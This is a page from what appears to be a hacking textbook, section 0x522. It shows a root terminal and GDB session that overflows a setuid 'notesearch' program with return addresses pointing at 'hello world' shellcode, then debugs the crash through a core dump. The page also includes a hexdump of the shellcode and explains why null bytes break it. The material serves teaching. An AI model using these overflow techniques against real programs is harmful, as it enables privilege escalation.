<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x522 Investigating with GDB</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part118.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part120.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark108">0x522 Investigating with GDB</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Since the notesearch program runs as root, we can’t debug it as a normal user. However, we also can’t just attach to a running copy of it, because it exits too quickly. Another way to debug programs is with core dumps. From a root prompt, the OS can be told to dump memory when the program crashes by using the command <span class="s31">ulimit -c unlimited</span>. This means that dumped core files are allowed to get as big as needed. Now, when the program crashes, the memory will be dumped to disk as a core file, which can be examined using GDB.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_851.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: justify;">reader@hacking:~/booksrc $ sudo su root@hacking:/home/reader/booksrc # ulimit -c unlimited</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: justify;">root@hacking:/home/reader/booksrc # export SHELLCODE=$(cat helloworld1) root@hacking:/home/reader/booksrc # ./getenvaddr SHELLCODE ./notesearch SHELLCODE will be at 0xbffff9a3</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">root@hacking:/home/reader/booksrc # ./notesearch $(perl -e &#39;print &quot;\xa3\xf9\ xff\xbf&quot;x40&#39;)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">-------[ end of note data ]------- Segmentation fault (core dumped)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">root@hacking:/home/reader/booksrc # ls -l ./core</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">-rw------- 1 root root 147456 2007-10-26 08:36 ./core root@hacking:/home/reader/booksrc # gdb -q -c ./core (no debugging symbols found)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. Core was generated by `./notesearch</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 9pt;text-align: left;">£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Program terminated with signal 11, Segmentation fault. #0 0x2c6541b7 in ?? ()</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) set dis intel (gdb) x/5i 0xbffff9a3</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff9a3:   call  0x2c6541b7 0xbffff9a8:   ins  BYTE PTR es:[edi],[dx]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff9a9:   outs  [dx],DWORD PTR ds:[esi] 0xbffff9aa:   sub  al,0x20</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff9ac:  ja  0xbffffa1d (gdb) i r eip</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">eip      0x2c6541b7    0x2c6541b7 (gdb) x/32xb 0xbffff9a3</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9a3:</p></td><td style="width:36pt"><p class="s42" style="padding-right: 8pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xe8</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x0f</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x48</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x65</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x6c</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x6c</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x6f</p></td><td style="width:28pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x2c</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9ab:</p></td><td style="width:36pt"><p class="s42" style="padding-right: 8pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x20</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x77</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x6f</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x72</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x6c</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x64</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x21</p></td><td style="width:28pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x0a</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9b3:</p></td><td style="width:36pt"><p class="s42" style="padding-right: 8pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x0d</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x59</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xb8</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x04</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbb</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x01</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xba</p></td><td style="width:28pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x0f</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff9bb:</p></td><td style="width:36pt"><p class="s42" style="padding-right: 8pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xcd</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x80</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xb8</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x01</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbb</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xcd</p></td><td style="width:34pt"><p class="s42" style="padding-left: 7pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x80</p></td><td style="width:28pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x00</p></td></tr><tr style="height:10pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">(gdb) quit</p></td><td style="width:36pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:28pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">root@hacking:/home/reader/booksrc # hexdump -C helloworld1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000000 e8 0f 00 00 00 48 65 6c 6c 6f 2c 20 77 6f 72 6c |.....Hello, worl|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000010 64 21 0a 0d 59 b8 04 00 00 00 bb 01 00 00 00 ba |d!..Y.     |</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000020 0f 00 00 00 cd 80 b8 01 00 00 00 bb 00 00 00 00 |.        |</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000030  cd 80                        |..|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000032</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">root@hacking:/home/reader/booksrc #</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_852.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Once GDB is loaded, the disassembly style is switched to Intel. Since we are running GDB as root, the .gdbinit file won’t be used. The memory where the shellcode should be is examined. The instructions look incorrect, but it seems like the first incorrect call instruction is what caused the crash. At least, execution was redirected, but something went wrong with the shellcode bytes. Normally, strings are terminated by a null byte, but here, the shell was kind enough to remove these null bytes for us. This, however, totally destroys the meaning of the machine code. Often, shellcode will be injected into a process as a string, using functions like <span class="s31">strcpy()</span>. Such functions will simply terminate at the first null byte, producing incomplete and unusable shellcode in mem- ory. In order for the shellcode to survive transit, it must be redesigned so it doesn’t contain any null bytes.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part118.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part120.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
